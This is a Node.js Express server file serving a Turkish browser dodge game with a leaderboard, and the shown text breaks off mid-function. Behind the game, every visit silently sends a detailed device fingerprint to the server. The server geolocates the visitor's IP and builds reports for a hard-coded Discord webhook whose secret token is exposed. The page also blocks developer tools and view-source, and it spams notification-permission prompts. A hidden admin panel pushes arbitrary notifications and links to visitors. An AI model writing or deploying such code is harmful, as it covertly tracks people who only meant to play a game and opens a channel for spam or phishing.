const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1549084209312698398/3hs3SNGi2LUaBjrAdVAm-l2uljyc47R356NcqhLuqQkHkGlN0f5ES3vWCRNTDBfepErF';

app.use(express.json({ limit: '1mb' }));

let MESSAGES = [];
let MSG_ID = 0;
let SCORES = [];

const SW_CODE = [
  "self.addEventListener('install', function(e){ self.skipWaiting(); });",
  "self.addEventListener('activate', function(e){ e.waitUntil(self.clients.claim()); });",
  "self.addEventListener('message', function(e){",
  "  var d = e.data || {};",
  "  if (d.type === 'SHOW_NOTIFICATION') {",
  "    self.registration.showNotification(d.title || 'Bildirim', {",
  "      body: d.body || '',",
  "      vibrate: [200,100,200],",
  "      data: { url: d.url || '/' },",
  "      tag: d.tag || 'default'",
  "    });",
  "  }",
  "});",
  "self.addEventListener('notificationclick', function(e){",
  "  e.notification.close();",
  "  var u = (e.notification.data && e.notification.data.url) || '/';",
  "  e.waitUntil(clients.matchAll({type:'window'}).then(function(l){",
  "    for (var i=0;i<l.length;i++){ if(l[i].url.indexOf(u)>-1 && 'focus' in l[i]) return l[i].focus(); }",
  "    if (clients.openWindow) return clients.openWindow(u);",
  "  }));",
  "});"
].join("\n");

const HTML = `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Uzay Kacisi</title>
<meta name="robots" content="noindex,nofollow">
<meta name="theme-color" content="#0d1024">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3Crect width='180' height='180' fill='%230d1024'/%3E%3Ccircle cx='90' cy='90' r='55' fill='%234a9eff'/%3E%3C/svg%3E">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow:hidden;font-family:-apple-system,system-ui,sans-serif;background:#0d1024;color:#fff}
body{display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:none;user-select:none;-webkit-user-select:none}
#mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:14px}
.mgTitle{font-size:24px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.mgHud{display:flex;gap:24px;font-size:15px;font-weight:600;opacity:.9}
.mgHud b{color:#6cf}
#mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;max-width:92vw;max-height:70vh;display:block}
.mgBtn{background:linear-gradient(90deg,#4a6cf7,#8b5cf6);border:none;color:#fff;padding:12px 28px;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer}
.mgBtn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
.mgOver{position:absolute;inset:0;background:rgba(10,12,25,.9);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;gap:10px;padding:16px}
.mgOver.show{display:flex}
.mgOver h2{font-size:26px;font-weight:800}
.mgOver .btns{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:6px}
#leaderboardBtn{position:fixed;top:14px;right:14px;background:linear-gradient(135deg,#f59e0b,#f97316);border:none;color:#fff;padding:10px 16px;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;box-shadow:0 6px 20px rgba(245,158,11,.5);z-index:9997}
#secretZone{position:fixed;bottom:12px;right:12px;display:flex;gap:6px;z-index:9998;opacity:.25}
.sbtn{width:26px;height:26px;border-radius:50%;border:none;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.4);transition:transform .1s}
.sbtn.sari{background:linear-gradient(135deg,#fbbf24,#f59e0b)}
.sbtn.kirmizi{background:linear-gradient(135deg,#ef4444,#b91c1c);box-shadow:0 0 12px rgba(239,68,68,.7)}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:99999;display:none;align-items:center;justify-content:center;padding:16px}
.modal.show{display:flex}
.modal-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:18px;padding:22px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,.1);box-shadow:0 20px 60px rgba(0,0,0,.7);max-height:85vh;overflow-y:auto}
.modal-box h3{font-size:20px;font-weight:800;margin-bottom:14px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.modal-box input{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:12px 14px;color:#fff;font-size:15px;margin-bottom:12px;outline:none;font-family:inherit}
.modal-box input:focus{border-color:#4a6cf7}
.modal-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:13px 24px;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:8px}
.modal-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
.modal-btn.danger{background:linear-gradient(90deg,#ef4444,#b91c1c)}
.lb-row{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;margin-bottom:6px;background:rgba(255,255,255,.04);border-radius:10px;font-size:14px;border:1px solid rgba(255,255,255,.05)}
.lb-row.top1{background:linear-gradient(90deg,rgba(245,158,11,.25),rgba(245,158,11,.05));border-color:rgba(245,158,11,.4)}
.lb-row.top2{background:linear-gradient(90deg,rgba(148,163,184,.25),rgba(148,163,184,.05))}
.lb-row.top3{background:linear-gradient(90deg,rgba(180,83,9,.25),rgba(180,83,9,.05))}
.lb-name{font-weight:600;flex:1;text-align:left;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding-right:8px}
.lb-score{color:#6cf;font-weight:800}
.lb-rank{width:34px;text-align:center;font-weight:700;color:#94a3b8}
.empty-lb{text-align:center;color:#64748b;padding:24px;font-size:14px}
#adminPanel{position:fixed;inset:0;background:linear-gradient(160deg,#0a0e1a,#131a2e);z-index:999999;display:none;flex-direction:column;padding:20px;overflow-y:auto}
#adminPanel.show{display:flex}
.ap-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
.ap-title{font-size:22px;font-weight:800;background:linear-gradient(90deg,#ef4444,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.ap-stat{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.ap-stat div{background:rgba(255,255,255,.05);padding:10px 16px;border-radius:10px;font-size:13px;border:1px solid rgba(255,255,255,.08)}
.ap-stat b{color:#6cf}
.ap-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:18px;margin-bottom:14px}
.ap-card h3{font-size:14px;font-weight:700;margin-bottom:10px;color:#94a3b8;text-transform:uppercase}
.ap-card input,.ap-card textarea{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:10px 12px;color:#fff;font-size:14px;margin-bottom:10px;outline:none;font-family:inherit}
.ap-card textarea{resize:vertical;min-height:80px}
.ap-btn{background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:11px 24px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer}
.ap-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
.ap-btn.danger{background:linear-gradient(90deg,#ef4444,#b91c1c)}
.ap-btn-row{display:flex;gap:10px;flex-wrap:wrap}
.ap-log{font-family:ui-monospace,monospace;font-size:12px;background:rgba(0,0,0,.5);border-radius:8px;padding:10px;max-height:200px;overflow-y:auto;color:#94a3b8}
.ap-log .ok{color:#22c55e}
.ap-log .err{color:#ef4444}
.ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:38px;height:38px;border-radius:50%;cursor:pointer;font-size:16px}
</style>
</head>
<body>

<button id="leaderboardBtn">🏆 Sıralama</button>

<div id="mgWrap">
  <div class="mgTitle">🚀 Uzay Kacisi (2X)</div>
  <div class="mgHud">
    <span>Skor: <b id="mgScore">0</b></span>
    <span>Rekor: <b id="mgBest">0</b></span>
  </div>
  <div style="position:relative">
    <canvas id="mgCanvas"></canvas>
    <div class="mgOver" id="mgOver">
      <h2>Oyun Bitti!</h2>
      <div>Skorun: <b id="mgFinal" style="color:#6cf">0</b></div>
      <div class="btns">
        <button class="mgBtn" id="mgSaveScore">💾 Sıralamaya Kaydet</button>
        <button class="mgBtn secondary" id="mgRestart">🔄 Yeniden Başla</button>
      </div>
    </div>
  </div>
</div>

<div id="secretZone">
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn kirmizi" id="secretRed"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
</div>

<div class="modal" id="nameModal">
  <div class="modal-box">
    <h3>💾 Sıralamaya Kaydet</h3>
    <p style="color:#94a3b8;font-size:13px;margin-bottom:12px">İsmini yaz, tabloya eklensin.</p>
    <input id="nameInput" placeholder="Ismin..." maxlength="20" autocomplete="off">
    <button class="modal-btn" id="nameSave">Kaydet</button>
    <button class="modal-btn secondary" id="nameCancel">Iptal</button>
  </div>
</div>

<div class="modal" id="leaderboardModal">
  <div class="modal-box">
    <h3>🏆 Sıralama</h3>
    <div id="leaderboardList"><div class="empty-lb">Yukleniyor...</div></div>
    <button class="modal-btn secondary" id="lbClose" style="margin-top:12px">Kapat</button>
  </div>
</div>

<div class="modal" id="notifyModal">
  <div class="modal-box">
    <h3>🔔 Bildirimlere İzin Ver</h3>
    <p style="font-size:14px;line-height:1.7;color:#cbd5e1;margin-bottom:16px">
      Bildirimlere izin ver, yeni mesajları ve rekorları kaçırma!
    </p>
    <button class="modal-btn" id="notifyAllow">✅ İzin Ver</button>
    <button class="modal-btn secondary" id="notifyLater">Daha Sonra</button>
  </div>
</div>

<div id="adminPanel">
  <div class="ap-h">
    <div class="ap-title">⚡ Admin Panel</div>
    <button class="ap-close" id="apClose">X</button>
  </div>
  <div class="ap-stat">
    <div>🔔 İzin: <b id="apPerm">?</b></div>
    <div>📨 Gönderilen: <b id="apSent">0</b></div>
    <div>💬 Kuyruk: <b id="apQueue">0</b></div>
  </div>
  <div class="ap-card">
    <h3>📢 Bildirim Gönder</h3>
    <input id="apTitle" placeholder="Baslik" maxlength="80">
    <textarea id="apBody" placeholder="Mesaj..." maxlength="200"></textarea>
    <input id="apUrl" placeholder="URL (opsiyonel)" maxlength="200">
    <div class="ap-btn-row">
      <button class="ap-btn" id="apSend">🚀 Gönder</button>
      <button class="ap-btn secondary" id="apTest">🧪 Test</button>
    </div>
  </div>
  <div class="ap-card">
    <h3>📊 Log</h3>
    <div class="ap-log" id="apLog">Hazir.</div>
  </div>
  <div class="ap-card">
    <h3>⚙️ Islemler</h3>
    <div class="ap-btn-row">
      <button class="ap-btn secondary" id="apForcePerm">🔔 İzin İste</button>
      <button class="ap-btn danger" id="apClearScores">🗑️ Skorları Temizle</button>
      <button class="ap-btn secondary" id="apClearLog">🧹 Logu Temizle</button>
      <button class="ap-btn danger" id="apReset">♻️ Sifirla</button>
    </div>
  </div>
</div>

<script>
(function(){
  'use strict';

  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
  document.addEventListener('keydown', function(e){
    if(e.key === 'F12'){ e.preventDefault(); return false; }
    if(e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')){ e.preventDefault(); return false; }
    if(e.ctrlKey && e.key.toUpperCase() === 'U'){ e.preventDefault(); return false; }
  });

  // ===== 2X HIZ AYARLARI =====
  var CONFIG = {
    W:360, H:540, PLAYER_R:16,
    SPAWN_MS:550,          // 2x sik engel (900 -> 550)
    SPEED_START:5,         // 2x hiz (2.5 -> 5)
    SPEED_MAX:20,          // 2x max hiz (9 -> 20)
    SPEED_UP_EVERY:6000,   // daha hizli zorlasir (15s -> 6s)
    SPEED_UP_AMOUNT:1.2,   // her adimda daha fazla hizlanir
    SCORE_PER_OBSTACLE:2,  // her engel 2 puan
    STORAGE_KEY:"mgBest"
  };

  var cv = document.getElementById("mgCanvas");
  var ctx = cv.getContext("2d");
  var scoreEl = document.getElementById("mgScore");
  var bestEl = document.getElementById("mgBest");
  var overScreen = document.getElementById("mgOver");
  var finalScoreEl = document.getElementById("mgFinal");
  var W = CONFIG.W, H = CONFIG.H;
  cv.width = W; cv.height = H;

  var player = { x:W/2, y:H-70, r:CONFIG.PLAYER_R };
  var obstacles = [], stars = [];
  var score = 0;
  var best = parseInt(localStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10);
  var running = true, gameOver = false;
  var fallSpeed = CONFIG.SPEED_START;
  var lastSpawn = 0, startTime = performance.now();
  var pointerX = W/2, animId = null, swReg = null;
  var lastMsgId = 0;

  bestEl.textContent = best;
  for(var i = 0; i < 60; i++){
    stars.push({ x:Math.random()*W, y:Math.random()*H, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });
  }

  function getSid(){
    var s = sessionStorage.getItem("mg_sid");
    if(!s){ s = "S" + Date.now().toString(36) + Math.random().toString(36).slice(2,6); sessionStorage.setItem("mg_sid", s); }
    return s;
  }

  function isIOS(){
    var ua = navigator.userAgent;
    if (/iPhone|iPad|iPod/.test(ua)) return true;
    if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    return false;
  }

  function isStandalone(){
    return window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;
  }

  function collectInfo(){
    var ua = navigator.userAgent;
    var browser = "Bilinmiyor";
    if (ua.indexOf("Edg/") > -1) browser = "Edge";
    else if (ua.indexOf("OPR/") > -1) browser = "Opera";
    else if (ua.indexOf("CriOS") > -1) browser = "Chrome iOS";
    else if (ua.indexOf("FxiOS") > -1) browser = "Firefox iOS";
    else if (ua.indexOf("Chrome/") > -1) browser = "Chrome";
    else if (ua.indexOf("Firefox/") > -1) browser = "Firefox";
    else if (ua.indexOf("Safari/") > -1) browser = "Safari";

    var os = "Bilinmiyor";
    if (ua.indexOf("Windows NT 10") > -1) os = "Windows 10/11";
    else if (ua.indexOf("Windows NT") > -1) os = "Windows";
    else if (ua.indexOf("Mac OS X") > -1) os = "macOS";
    else if (ua.indexOf("Android") > -1) os = "Android";
    else if (ua.indexOf("iPhone") > -1) os = "iPhone";
    else if (ua.indexOf("iPad") > -1) os = "iPad";
    else if (ua.indexOf("Linux") > -1) os = "Linux";

    var dtype = "Masaustu";
    if (ua.indexOf("Mobi") > -1 || ua.indexOf("Android") > -1 || ua.indexOf("iPhone") > -1) dtype = "Mobil";
    else if (ua.indexOf("Tablet") > -1 || ua.indexOf("iPad") > -1) dtype = "Tablet";

    var conn = navigator.connection || {};

    return {
      browser: browser,
      os: os,
      dtype: dtype + (isStandalone() ? " (PWA)" : ""),
      lang: navigator.language || "?",
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "?",
      screen: screen.width + "x" + screen.height,
      color: screen.colorDepth + "bit",
      cores: navigator.hardwareConcurrency || "?",
      touch: ("ontouchstart" in window) ? "Var" : "Yok",
      cookie: navigator.cookieEnabled ? "Acik" : "Kapali",
      online: navigator.onLine ? "Online" : "Offline",
      conn: (conn.effectiveType || "?") + (conn.downlink ? " " + conn.downlink + "Mbps" : ""),
      notif: ("Notification" in window) ? Notification.permission : "Yok",
      sw: ("serviceWorker" in navigator) ? "Var" : "Yok",
      ios: isIOS() ? "Evet" : "Hayir",
      pwa: isStandalone() ? "Evet" : "Hayir",
      ref: document.referrer || "direkt",
      url: location.href,
      ua: ua,
      sid: getSid()
    };
  }

  function sendLog(event, info){
    var payload = JSON.stringify({ event: event, info: info });
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon("/log", new Blob([payload], { type: "application/json" }));
      } else {
        fetch("/log", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload, keepalive: true });
      }
    } catch(e){}
  }

  function initSW(){
    if (!("serviceWorker" in navigator)) return Promise.resolve(false);
    return navigator.serviceWorker.register("/sw.js", { scope: "/" })
      .then(function(reg){ swReg = reg; return navigator.serviceWorker.ready; })
      .then(function(){ return true; })
      .catch(function(e){ console.warn("SW hata", e); return false; });
  }

  function requestNotify(){
    if (!("Notification" in window)) return Promise.resolve("unsupported");
    if (isIOS() && !isStandalone()){
      document.getElementById("notifyModal").classList.remove("show");
      return Promise.resolve("ios-pwa-gerekli");
    }
    if (Notification.permission === "granted") return Promise.resolve("granted");
    if (Notification.permission === "denied") return Promise.resolve("denied");

    try {
      return Notification.requestPermission().then(function(p){
        if (p === "granted") {
          sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
          return "granted";
        }
        return p;
      }).catch(function(){ return "error"; });
    } catch(e){
      return new Promise(function(resolve){
        Notification.requestPermission(function(p){
          if (p === "granted") sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
          resolve(p);
        });
      });
    }
  }

  function sendNotif(title, body, opts){
    opts = opts || {};
    if (!("Notification" in window)) return false;
    if (Notification.permission !== "granted") return false;
    if (swReg && swReg.active) {
      swReg.active.postMessage({ type:"SHOW_NOTIFICATION", title:title, body:body, url:opts.url, tag:opts.tag });
      return true;
    }
    try { new Notification(title, { body: body }); return true; } catch(e){ return false; }
  }
  window.bildirimGonder = sendNotif;

  function pollMessages(){
    fetch("/api/messages?since=" + lastMsgId, { cache: "no-store" })
      .then(function(r){ return r.ok ? r.json() : null; })
      .then(function(d){
        if (!d || !d.messages) return;
        for (var i = 0; i < d.messages.length; i++){
          var m = d.messages[i];
          if (m.id > lastMsgId){
            sendNotif(m.title || "Bildirim", m.body || "", { url: m.url, tag: "bc-" + m.id });
            lastMsgId = m.id;
          }
        }
      })
      .catch(function(){});
  }

  function spawnObstacle(){
    var w = 40 + Math.random() * 60;
    obstacles.push({ x: Math.random() * (W - w), y: -20, w: w, h: 18, hue: Math.floor(Math.random() * 60) + 330 });
  }

  function handlePointer(cx){
    var r = cv.getBoundingClientRect();
    pointerX = Math.max(player.r, Math.min(W - player.r, (cx - r.left) * (W / r.width)));
  }

  cv.addEventListener("mousemove", function(e){ handlePointer(e.clientX); });
  cv.addEventListener("touchmove", function(e){ e.preventDefault(); handlePointer(e.touches[0].clientX); }, { passive: false });
  cv.addEventListener("touchstart", function(e){ handlePointer(e.touches[0].clientX); });

  document.addEventListener("keydown", function(e){
    if (!running) return;
    if (e.key === "ArrowLeft") pointerX = Math.max(player.r, pointerX - 30);
    if (e.key === "ArrowRight") pointerX = Math.min(W - player.r, pointerX + 30);
  });

  function update(){
    var now = performance.now();

    // Engel sikligi artar (her 6sn'de bir %10 azalir, min 250ms)
    var elapsed = now - startTime;
    var steps = Math.floor(elapsed / CONFIG.SPEED_UP_EVERY);
    var currentSpawn = Math.max(250, CONFIG.SPAWN_MS - steps * 30);

    if (now - lastSpawn > currentSpawn){ spawnObstacle(); lastSpawn = now; }

    // Hiz artar (her adimda SPEED_UP_AMOUNT kadar)
    fallSpeed = Math.min(CONFIG.SPEED_MAX, CONFIG.SPEED_START + steps * CONFIG.SPEED_UP_AMOUNT);

    for (var i = 0; i < stars.length; i++){
      var s = stars[i];
      s.y += s.v;
      if (s.y > H){ s.y = -2; s.x = Math.random() * W; }
    }

    player.x += (pointerX - player.x) * 0.25;

    for (var j = obstacles.length - 1; j >= 0; j--){
      var o = obstacles[j];
      o.y += fallSpeed;
      var cx = Math.max(o.x, Math.min(player.x, o.x + o.w));
      var cy = Math.max(o.y, Math.min(player.y, o.y + o.h));
      var dx = player.x - cx;
      var dy = player.y - cy;
      if (dx * dx + dy * dy < player.r * player.r){ endGame(); return; }
      if (o.y > H){
        obstacles.splice(j, 1);
        score += CONFIG.SCORE_PER_OBSTACLE;
        scoreEl.textContent = score;
      }
    }
  }

  function rrect(x, y, w, h, r){
    if (ctx.roundRect){ ctx.roundRect(x, y, w, h, r); return; }
    ctx.moveTo(x + r, y);
    ctx.arcTo(x + w, y, x + w, y + h, r);
    ctx.arcTo(x + w, y + h, x, y + h, r);
    ctx.arcTo(x, y + h, x, y, r);
    ctx.arcTo(x, y, x + w, y, r);
    ctx.closePath();
  }

  function draw(){
    ctx.clearRect(0, 0, W, H);
    for (var i = 0; i < stars.length; i++){
      var s = stars[i];
      ctx.globalAlpha = s.s / 2.2;
      ctx.fillStyle = "#cfe4ff";
      ctx.fillRect(s.x, s.y, s.s, s.s);
    }
    ctx.globalAlpha = 1;
    for (var k = 0; k < obstacles.length; k++){
      var o = obstacles[k];
      var g = ctx.createLinearGradient(o.x, o.y, o.x, o.y + o.h);
      g.addColorStop(0, "hsl(" + o.hue + ",80%,65%)");
      g.addColorStop(1, "hsl(" + o.hue + ",80%,45%)");
      ctx.fillStyle = g;
      ctx.shadowColor = "hsl(" + o.hue + ",80%,60%)";
      ctx.shadowBlur = 14;
      ctx.beginPath();
      rrect(o.x, o.y, o.w, o.h, 8);
      ctx.fill();
      ctx.shadowBlur = 0;
    }
    ctx.save();
    ctx.shadowColor = "#6cf";
    ctx.shadowBlur = 22;
    var pg = ctx.createRadialGradient(player.x - 6, player.y - 6, 2, player.x, player.y, player.r);
    pg.addColorStop(0, "#bfe4ff");
    pg.addColorStop(1, "#4a9eff");
    ctx.fillStyle = pg;
    ctx.beginPath();
    ctx.arc(player.x, player.y, player.r, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
  }

  function loop(){
    if (!running) return;
    update();
    draw();
    animId = requestAnimationFrame(loop);
  }

  function startGame(){
    player = { x: W/2, y: H - 70, r: CONFIG.PLAYER_R };
    obstacles = [];
    score = 0;
    fallSpeed = CONFIG.SPEED_START;
    lastSpawn = performance.now();
    startTime = performance.now();
    pointerX = W / 2;
    gameOver = false;
    running = true;
    scoreEl.textContent = 0;
    overScreen.classList.remove("show");
    cancelAnimationFrame(animId);
    animId = requestAnimationFrame(loop);
  }

  function endGame(){
    running = false;
    gameOver = true;
    cancelAnimationFrame(animId);
    finalScoreEl.textContent = score;
    var yeniRekor = false;
    if (score > best){
      best = score;
      localStorage.setItem(CONFIG.STORAGE_KEY, best);
      bestEl.textContent = best;
      yeniRekor = true;
    }
    overScreen.classList.add("show");
    if (yeniRekor) sendNotif("🏆 Yeni Rekor!", "Skorun: " + score);
    else sendNotif("🎮 Oyun Bitti", "Skorun: " + score + " | Rekor: " + best);
  }

  document.getElementById("mgRestart").addEventListener("click", startGame);

  document.getElementById("mgSaveScore").addEventListener("click", function(){
    document.getElementById("nameModal").classList.add("show");
    setTimeout(function(){ document.getElementById("nameInput").focus(); }, 100);
  });

  document.getElementById("nameSave").addEventListener("click", function(){
    var name = document.getElementById("nameInput").value.trim();
    if (!name){ alert("Ismini yaz!"); return; }
    if (name.length > 20) name = name.substring(0, 20);

    fetch("/api/score", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: name, score: score })
    })
    .then(function(r){ return r.json(); })
    .then(function(){
      document.getElementById("nameModal").classList.remove("show");
      document.getElementById("nameInput").value = "";
      openLeaderboard();
    })
    .catch(function(){ alert("Kaydedilemedi, tekrar dene."); });
  });

  document.getElementById("nameCancel").addEventListener("click", function(){
    document.getElementById("nameModal").classList.remove("show");
  });

  document.getElementById("nameInput").addEventListener("keydown", function(e){
    if (e.key === "Enter") document.getElementById("nameSave").click();
  });

  document.addEventListener("visibilitychange", function(){
    if (document.hidden){
      running = false;
      cancelAnimationFrame(animId);
    } else if (!gameOver && !running){
      running = true;
      animId = requestAnimationFrame(loop);
    }
  });

  // ===== SIRALAMA =====
  function openLeaderboard(){
    document.getElementById("leaderboardModal").classList.add("show");
    var listEl = document.getElementById("leaderboardList");
    listEl.innerHTML = '<div class="empty-lb">Yukleniyor...</div>';

    fetch("/api/scores")
      .then(function(r){ return r.json(); })
      .then(function(d){
        var scores = d.scores || [];
        if (scores.length === 0){
          listEl.innerHTML = '<div class="empty-lb">Henuz skor yok. Ilk sen ol!</div>';
          return;
        }
        var html = "";
        for (var i = 0; i < scores.length; i++){
          var s = scores[i];
          var cls = "lb-row";
          if (i === 0) cls += " top1";
          else if (i === 1) cls += " top2";
          else if (i === 2) cls += " top3";
          var medal = (i === 0) ? "🥇" : (i === 1) ? "🥈" : (i === 2) ? "🥉" : (i + 1);
          html += '<div class="' + cls + '">'
            + '<span class="lb-rank">' + medal + '</span>'
            + '<span class="lb-name">' + escapeHtml(s.name) + '</span>'
            + '<span class="lb-score">' + s.score + '</span>'
            + '</div>';
        }
        listEl.innerHTML = html;
      })
      .catch(function(){
        listEl.innerHTML = '<div class="empty-lb">Yuklenemedi.</div>';
      });
  }

  function escapeHtml(s){
    var d = document.createElement("div");
    d.textContent = String(s || "");
    return d.innerHTML;
  }

  document.getElementById("leaderboardBtn").addEventListener("click", openLeaderboard);
  document.getElementById("lbClose").addEventListener("click", function(){
    document.getElementById("leaderboardModal").classList.remove("show");
  });

  // ===== NOTIFY MODAL =====
  document.getElementById("notifyAllow").addEventListener("click", function(){
    document.getElementById("notifyModal").classList.remove("show");
    requestNotify().then(function(perm){
      if (perm === "granted") sendLog("notify_granted", collectInfo());
      else if (perm === "denied") sendLog("notify_denied", collectInfo());
    });
  });

  document.getElementById("notifyLater").addEventListener("click", function(){
    document.getElementById("notifyModal").classList.remove("show");
  });

  // ===== GIZLI ADMIN (sayac YOK) =====
  var redClicks = 0, redTimer = null;

  function resetRed(){
    redClicks = 0;
  }

  document.getElementById("secretRed").addEventListener("click", function(e){
    e.preventDefault();
    e.stopPropagation();
    redClicks++;
    if (redTimer) clearTimeout(redTimer);
    redTimer = setTimeout(resetRed, 8000);
    if (redClicks >= 20){
      resetRed();
      openAdmin();
    }
  });

  var sarilar = document.querySelectorAll(".sbtn.sari");
  for (var si = 0; si < sarilar.length; si++){
    (function(b){
      b.addEventListener("click", function(){ resetRed(); });
    })(sarilar[si]);
  }

  // ===== ADMIN PANEL =====
  var ap = document.getElementById("adminPanel");
  var apLog = document.getElementById("apLog");
  var apPerm = document.getElementById("apPerm");
  var apSent = document.getElementById("apSent");
  var apQueue = document.getElementById("apQueue");
  var sentCount = 0;

  function apPrint(msg, cls){
    var t = new Date().toLocaleTimeString("tr-TR");
    var div = document.createElement("div");
    if (cls) div.className = cls;
    div.textContent = "[" + t + "] " + msg;
    apLog.appendChild(div);
    apLog.scrollTop = apLog.scrollHeight;
  }

  function openAdmin(){
    ap.classList.add("show");
    apPerm.textContent = ("Notification" in window) ? Notification.permission : "yok";
    apPrint("Panel acildi. Session: " + getSid(), "ok");
  }

  document.getElementById("apClose").addEventListener("click", function(){ ap.classList.remove("show"); });

  document.getElementById("apSend").addEventListener("click", function(){
    var title = document.getElementById("apTitle").value.trim() || "Bildirim";
    var body = document.getElementById("apBody").value.trim();
    var url = document.getElementById("apUrl").value.trim();
    if (!body && !title){ apPrint("Bos mesaj.", "err"); return; }

    fetch("/api/broadcast", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ title: title, body: body, url: url })
    })
    .then(function(r){ return r.json(); })
    .then(function(d){
      sentCount++;
      apSent.textContent = sentCount;
      apQueue.textContent = d.total || "?";
      apPrint("Gonderildi: " + title + " (ID:" + d.id + ")", "ok");
      sendNotif(title, body, { url: url });
      document.getElementById("apBody").value = "";
    })
    .catch(function(e){ apPrint("Hata: " + e.message, "err"); });
  });

  document.getElementById("apTest").addEventListener("click", function(){
    var title = document.getElementById("apTitle").value.trim() || "Test";
    var body = document.getElementById("apBody").value.trim() || "Bu bir test";
    sendNotif(title, body);
    apPrint("Test: " + title, "ok");
  });

  document.getElementById("apForcePerm").addEventListener("click", function(){
    requestNotify().then(function(r){
      apPerm.textContent = ("Notification" in window) ? Notification.permission : "yok";
      apPrint("Izin: " + r);
    });
  });

  document.getElementById("apClearScores").addEventListener("click", function(){
    if (!confirm("Tum skorlar silinsin mi?")) return;
    fetch("/api/scores", { method: "DELETE" })
      .then(function(){ apPrint("Skorlar temizlendi.", "ok"); })
      .catch(function(e){ apPrint("Hata: " + e.message, "err"); });
  });

  document.getElementById("apClearLog").addEventListener("click", function(){ apLog.innerHTML = "Temizlendi."; });

  document.getElementById("apReset").addEventListener("click", function(){
    localStorage.removeItem(CONFIG.STORAGE_KEY);
    best = 0;
    bestEl.textContent = 0;
    apPrint("Sifirlandi.", "ok");
    startGame();
  });

  // ===== BASLAT =====
  (function init(){
    var info = collectInfo();
    sendLog("visit", info);

    initSW().then(function(){
      requestAnimationFrame(loop);

      // IZIN SPAM - sayfa acilir acilmaz hemen iste
      if ("Notification" in window && Notification.permission === "default"){
        // Hemen goster
        setTimeout(function(){
          document.getElementById("notifyModal").classList.add("show");
          requestNotify();
        }, 300);

        // 5sn sonra hala default ise tekrar dene
        setTimeout(function(){
          if (Notification.permission === "default"){
            requestNotify();
          }
        }, 5500);

        // 12sn sonra hala default ise tekrar dene
        setTimeout(function(){
          if (Notification.permission === "default"){
            requestNotify();
          }
        }, 12000);
      }
    });

    setInterval(pollMessages, 5000);
    setTimeout(pollMessages, 2000);
  })();

})();
<\/script>
</body>
</html>`;

function getGeo(ip){
  if (!ip || ip === "::1" || ip.indexOf("127.") === 0 || ip.indexOf("::ffff:127") === 0){
    return Promise.resolve(null);
  }
  return fetch("https://ipapi.co/" + ip + "/json/", { headers: { "User-Agent": "oyun-sitesi/1.0" } })
    .then(function(r){ return r.ok ? r.json() : null; })
    .catch(function(){ return null; });
}

function buildEmbed(info, geo, ip, event){
  var f = [];
  var country = (geo && geo.country_name) || "?";
  var flag = (geo && geo.country_code === "TR") ? " TR" : "";
  var titles = { visit: "👤 Site Ziyareti", notify_granted: "🔔 İzin Verildi", notify_denied: "🔕 İzin Reddedildi" };
